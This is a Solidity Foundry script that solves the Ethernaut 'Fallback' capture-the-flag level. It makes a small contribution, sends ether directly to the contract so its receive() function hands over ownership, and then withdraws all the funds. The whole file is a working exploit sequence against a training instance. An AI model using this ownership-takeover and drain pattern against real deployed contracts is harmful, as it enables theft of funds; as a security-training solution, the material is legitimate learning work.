// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IFallback {
    function contribute() external payable;
    function withdraw() external;
    function owner() external view returns (address);
    function getContribution() external view returns (uint256);
}

/**
 * @title Challenge 01 Solution Script
 * @notice Claim ownership via receive() fallback, then withdraw all funds
 */
contract FallbackSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x4bc8406D5b70a0F0852577bE775249Acc026e75e;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        IFallback target = IFallback(INSTANCE);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Contribute a small amount (less than 0.001 ether)
        target.contribute{value: 0.0001 ether}();
        console.log("Contributed 0.0001 ether");

        // Step 2: Send ETH directly to trigger receive() and become owner
        (bool success,) = INSTANCE.call{value: 0.0001 ether}("");
        require(success, "Failed to send ETH");
        console.log("Sent ETH to trigger receive(), new owner:", target.owner());

        // Step 3: Withdraw all funds
        target.withdraw();
        console.log("Withdrew all funds");

        vm.stopBroadcast();

        console.log("Challenge 01 completed!");
    }
}
